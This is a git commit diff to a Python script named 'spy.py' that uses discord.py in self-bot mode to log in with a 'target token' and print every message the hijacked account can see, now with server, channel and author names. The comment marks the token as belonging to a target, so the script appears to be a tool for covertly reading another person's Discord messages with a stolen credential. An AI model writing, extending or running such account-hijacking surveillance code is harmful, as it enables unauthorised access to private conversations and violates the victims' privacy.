5932624c1b14e301c9e30c9ae7c68d70fcefdb8a
NullByte75 <66488397+NullByte75@users.noreply.github.com>
2020-07-30 12:00:03 +0200

    Update spy.py

--- spy.py
+++ spy.py
@@ -1,14 +1,14 @@
 import discord
 from discord.ext import commands
 import asyncio
-token = "" #insert target token
+token = "somerandomtokenblablabla" #insert target token
 prefix = ""
 client = discord.Client()
 message = discord.Message 
 bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_message(message):
-    print(message.author.name + ":" + " " + message.content)
+    print("on:" + " " + message.guild.name + " " + " in ch:" + " " +  message.channel.name + " " + "from:" + " " + message.author.name + ":" + " " + message.content)
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
 bot.run(token, bot=False)
